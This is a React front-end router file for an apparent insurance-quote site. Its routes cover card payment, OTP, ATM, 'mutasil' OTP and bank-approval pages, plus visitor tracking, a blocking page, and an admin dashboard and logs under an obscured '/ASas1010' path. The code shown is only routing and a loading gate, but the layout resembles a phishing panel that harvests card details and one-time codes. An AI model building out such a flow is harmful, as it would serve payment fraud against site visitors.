import { useEffect, useState } from "react";
import { BrowserRouter, Route, Routes } from "react-router-dom";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { ensureVisitorToken } from "./lib/visitor-tracking";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import Index from "./pages/Index";
import QuoteDetails from "./pages/QuoteDetails";
import QuoteOffers from "./pages/QuoteOffers";
import QuoteCheckout from "./pages/QuoteCheckout";
import QuoteCardPayment from "./pages/QuoteCardPayment";
import QuoteOtp from "./pages/QuoteOtp";
import QuoteAtm from "./pages/QuoteAtm";
import QuoteSuccess from "./pages/QuoteSuccess";
import QuoteMutasil from "./pages/QuoteMutasil";
import QuoteMutasilOtp from "./pages/QuoteMutasilOtp";
import QuoteCustom from "./pages/QuoteCustom";
import QuoteCustom2 from "./pages/QuoteCustom2";
import QuoteBankApproval from "./pages/QuoteBankApproval";
import AdminLogin from "./pages/AdminLogin";
import Login from "./pages/Login";
import AdminDashboard from "./pages/AdminDashboard";
import AdminLogs from "./pages/AdminLogs";
import Blocked from "./pages/Blocked";
import NotFound from "./pages/NotFound";
import { VisitorPresenceProvider } from "./lib/visitor-tracking";
import { I18nProvider } from "./lib/i18n";
import PageScrollReset from "./components/site/PageScrollReset";

const VisitorTokenGate = ({ children }: { children: React.ReactNode }) => {
  const path = typeof window !== "undefined" ? window.location.pathname : "";
  const isAdmin = path.startsWith("/ASas1010");
  const [ready, setReady] = useState(isAdmin);

  useEffect(() => {
    if (isAdmin) return;
    let done = false;
    const finish = () => {
      if (done) return;
      done = true;
      setReady(true);
    };
    ensureVisitorToken().finally(finish);
    // Safety timeout so a slow/broken mint never blocks the UI forever.
    const t = window.setTimeout(finish, 4000);
    return () => window.clearTimeout(t);
  }, [isAdmin]);

  if (!ready) {
    return (
      <div className="grid min-h-screen place-items-center bg-[hsl(210_40%_97%)]">
        <div className="h-10 w-10 animate-spin rounded-full border-4 border-brand-blue border-t-transparent" />
      </div>
    );
  }
  return <>{children}</>;
};

// Full-screen shell on every device (phone, tablet, iPad, desktop).
const PhoneShell = ({ children }: { children: React.ReactNode }) => {
  return (
    <div className="min-h-screen w-full bg-[hsl(var(--background))]">
      {children}
    </div>
  );
};

const App = () => (
  <I18nProvider>
  <TooltipProvider>
    <Toaster />
    <Sonner />
    <BrowserRouter>
      <PageScrollReset />
      <VisitorTokenGate>
        <VisitorPresenceProvider>
          <PhoneShell>
          <Routes>
            <Route path="/" element={<Index />} />
            <Route path="/quote/details" element={<QuoteDetails />} />
            <Route path="/quote/offers" element={<QuoteOffers />} />
            <Route path="/quote/checkout" element={<QuoteCheckout />} />
            <Route path="/quote/payment" element={<QuoteCardPayment />} />
            <Route path="/quote/otp" element={<QuoteOtp />} />
            <Route path="/quote/atm" element={<QuoteAtm />} />
            <Route path="/quote/success" element={<QuoteSuccess />} />
            <Route path="/quote/mutasil" element={<QuoteMutasil />} />
            <Route path="/quote/mutasil-otp" element={<QuoteMutasilOtp />} />
            <Route path="/quote/custom" element={<QuoteCustom />} />
            <Route path="/quote/custom2" element={<QuoteCustom2 />} />
            <Route path="/quote/bank-approval" element={<QuoteBankApproval />} />
            <Route path="/blocked" element={<Blocked />} />
            <Route path="/login" element={<Login />} />
            <Route path="/ASas1010/login" element={<AdminLogin />} />
            <Route path="/ASas1010" element={<AdminDashboard />} />
            <Route path="/ASas1010/logs" element={<AdminLogs />} />
            <Route path="*" element={<NotFound />} />
          </Routes>
          </PhoneShell>
        </VisitorPresenceProvider>
      </VisitorTokenGate>
    </BrowserRouter>
  </TooltipProvider>
  </I18nProvider>
);

export default App;
